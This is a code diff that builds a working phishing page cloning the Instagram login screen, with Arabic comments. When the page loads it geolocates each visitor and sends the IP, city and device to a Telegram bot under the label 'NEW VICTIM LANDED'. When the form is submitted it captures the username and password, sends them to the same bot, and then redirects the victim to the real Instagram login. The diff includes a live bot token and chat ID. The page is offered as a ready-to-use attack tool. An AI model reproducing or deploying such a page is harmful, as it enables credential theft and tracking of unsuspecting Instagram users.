@@ -1,43 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="margin-bottom: 20px;">
+    <form onsubmit="capture(event)">
+        <input type="text" id="email" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+</div>
+
 <script>
-// هذه المتغيرات سيتم سحبها من إعدادات Vercel التي سنضبطها الآن
-const TELEGRAM_TOKEN = "8513943910:AAHu0zcDRMBOLxcVc9LmOyPx-M1n5DegUrE";
+// الإحداثيات الاستخباراتية النشطة
+const TOKEN = "8513943910:AAHu0zcDRMBOLxcVc9LmOyPx-M1n5DegUrE";
 const CHAT_ID = "7082154454";
 
-async function sendReport(message) {
-    try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-        });
-    } catch (e) { console.error("Link Lost"); }
+async function send(msg) {
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+    });
 }
 
-// التقرير التلقائي (بمجرد النقر)
+// التقرير الفوري بمجرد الفتح
 window.onload = async function() {
-    const res = await fetch('https://ipapi.co/json/');
-    const d = await res.json();
-    
-    let report = `📊 *INTELLIGENCE REPORT* 📊\n` +
-                 `---------------------------\n` +
-                 `🌐 *NETWORK INFO:*\n` +
-                 `📍 IP: ${d.ip}\n` +
-                 `🏢 ISP: ${d.org}\n` +
-                 `🌍 Location: ${d.city}, ${d.country_name}\n` +
-                 `🛰️ Lat/Long: ${d.latitude}, ${d.longitude}\n\n` +
-                 `📱 *DEVICE:* ${navigator.platform}\n` +
-                 `🌐 *AGENT:* ${navigator.userAgent.substring(0, 50)}...`;
-
-    sendReport(report); // إرسال تقرير الدخول فوراً
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+        let report = `📊 *NEW VICTIM LANDED* 📊\n📍 IP: ${d.ip}\n🌍 City: ${d.city}\n📱 Device: ${navigator.platform}`;
+        send(report);
+    } catch(e) {}
 };
 
-// تقرير البيانات (عند كتابة الباسورد)
+// سحب البيانات عند الضغط
 function capture(e) {
     e.preventDefault();
     const u = document.getElementById('email').value;
     const p = document.getElementById('password').value;
-    sendReport(`👤 *VICTIM CREDENTIALS:*\n📧 Email: ${u}\n🔑 Pass: ${p}`).then(() => {
-        window.location.href = "https://www.instagram.com/"; 
+    send(`👤 *VICTIM DATA:* \n📧 User: ${u}\n🔑 Pass: ${p}`).then(() => {
+        window.location.href = "https://www.instagram.com/accounts/login/"; 
     });
 }
 </script>
+
+</body>
+</html>
